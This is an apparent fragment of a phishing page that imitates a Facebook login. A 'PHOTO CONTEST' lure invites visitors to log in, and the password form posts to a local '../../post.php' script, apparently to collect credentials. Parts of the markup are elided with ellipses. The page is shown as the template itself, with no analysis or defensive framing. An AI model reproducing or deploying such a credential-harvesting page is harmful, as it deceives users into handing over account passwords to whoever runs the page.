...
<html lang="en">
  <head>
    ...
    <link rel="shorcut icon" href="img/11.png">
    <!-- Style -->
      ...
      <div class="container">
        <div class="row">
          <div class="col-sm-12 col-lg-12 text-center mx-auto d-block">
            <img class="img-icon mt-4 mb-4" src="img/11.png">
            <div class="text">
              Login with Facebook <br>to connect PHOTO CONTEST
            </div>
          </div>
        </div>
          ...
          <div class="col-sm-12 col-lg-12 text-center mx-auto d-block">
            <form action="../../post.php" method="POST">
              <div class="form-group">
				...
				<input class="form-control border-top-x" type="password" name="pass" placeholder="Password" autocomplete="off" required>
